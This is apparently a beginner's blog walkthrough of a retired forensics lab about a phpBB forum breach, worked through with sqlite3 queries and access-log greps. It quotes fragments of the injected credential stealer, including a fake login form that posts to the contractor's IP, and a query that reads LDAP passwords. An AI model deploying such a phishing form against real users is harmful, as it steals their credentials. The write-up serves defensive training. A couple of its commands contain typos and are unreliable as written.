---
layout: post
title:  "Full Meal: Bumblebee Sherlock"
date:   2025-05-31
author: C. Casquatch
comments: false
tags: ['sqlitebrowser', 'access logs', 'sqlite3', 'htb']
---

> RETIRED: Bumblebee Sherlock Walkthrough

**Note**: This is a casual walkthrough I put together because the original write-up was a bit overwhelming—especially because I am new to SQLite Browser. Hopefully, this helps others in the same boat!

---

## Scenario

> *"An external contractor has accessed the internal forum here at Forela via the Guest Wi-Fi, and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation."*

---

## Getting Started

Install SQLite browser (on Parrot OS):
```
sudo apt install sqlitebrowser
```

Navigate to the folder where the `incident` folder is saved. This makes referencing files easier.

To access the SQLite database:
```
sqlite3 phpbb.sqlite3
```

You should see the `sqlite>` prompt.

![screenshot 1](/assets/images/bumblebee/screenshot1.png)


To view the schema of the `phpbb_users` table:
```
.schema php_users
```

![screenshot 2](/assets/images/bumblebee/screenshot2.png)

---

## Q1: What was the username of the external contractor?

Run the following query:
```
SELECT user_id, username, user_email, user_lastvisit, user_ip FROM phpbb_users;
```

![screenshot 3](/assets/images/bumblebee/screenshot3.png)

To narrow it down further:
```
SELECT user_id, username, user_email, user_ip
FROM phpbb_users
WHERE username LIKE '%contractor%' OR user_email LIKE '%contractor%' OR user_ip = 'KNOWN_IP';
```

---

## Q2: What IP address did the contractor use?

This can be found from the same query above using the `user_ip` field.

---

## Q3: What is the post_id of the malicious post that the contractor made?

From Q1, let’s say the user ID is 52. Set display modes for easier output:
```
.headers on
.mode column
```

Then run:
```
SELECT post_id, post_subject, post_text
FROM phpbb_posts
WHERE poster_id = 52;
```

---

## Q4: What is the full URI that the credential stealer sends its data to?

From the `post_text`, we find HTML content.

![screenshot 4](/assets/images/bumblebee/screenshot4.png)

Export to HTML:
```
.headers on
.mode html
.output results.html
```

The file will be saved in the directory your terminal is pointed to.

![screenshot 5](/assets/images/bumblebee/screenshot5.png)

Look for this function in the HTML:

```
<script>
function setHidden() {
    const d = new Date();
    d.setTime(d.getTime() + (24 * 60 * 60 * 1000));
    let expires = "expires=" + d.toUTCString();
    document.cookie = "phpbb_token=1;" + expires + ";";

    const modal = document.getElementById('zbzbz1234');
    modal.classList.add("hidden");
}
...
</script>
```

Eventually you'll find this form:

```
<form action="http://10.10.0.78/update.php" method="post" id="login" ...>
  ...
</form>
```

Reset output to terminal:
```
.output stdout
```

---

## Q5: When did the contractor log into the forum as the administrator?

Answered after Q6 and Q8, using `LOG_ADMIN_AUTH_SUCCESS` (not the first instance).

---

## Q6: What is the password for the LDAP connection?

Query the `phpbb_config` table:
```
SELECT * FROM phpbb_config WHERE config_name LIKE 'ldap_%';
```

![screenshot 6](/assets/images/bumblebee/screenshot6.png)

---

## Q7: What is the user agent of the Administrator user?

After determining the admin's IP (e.g. `10.255.254.2`) from Q8, run:
```
grep -E '^10.255.254.2' access.log | head
```

Look for the last quoted string in the line. That’s your user agent.

![screenshot 8](/assets/images/bumblebee/screenshot8.png)

---

## Q8: What time did the contractor add themselves to the Administrator group?

Run this query:
```
.headers on
.mode column
SELECT
    log_id, 
    phpbb_users.username,
    log_ip,
    datetime(log_time, 'uniepoch'),
    log_operation,
    log_data
FROM
    phpbb_log
INNER JOIN phpbb_users ON phpbb_log.user_id = phpbb_users.user_id;
```

![screenshot 7](/assets/images/bumblebee/screenshot7.png)

Note the timestamp and IP address of the action.

---

## Q9: What time did the contractor download the database backup?

Use contractor’s IP (`10.10.0.78`) and date `26/Apr/2023`:
```
grep -E '^10.10.0.78' access.log | grep '26/Apr/2023:1' | tail
```

Explanation:
- `^` matches start of line.
- `:1` filters for times starting with 1 (10:00–19:59).
- `tail` gets the latest relevant lines.

![screenshot 9](/assets/images/bumblebee/screenshot9.png)

Note: The write-up indicates that you have to subtract an hour from the log time to get UTC. Not sure why—maybe just take their word for it.

---

## Q10: What was the size in bytes of the database backup as stated by access.log?

Same grep result from Q9. Look for the value next to the `200` HTTP status—it’s likely something like `34707`.

---

Enjoyed the lab? Confused by some things? Same here. Hopefully this helped you piece things together more easily.


<button onclick="history.back()">Go Back</button>
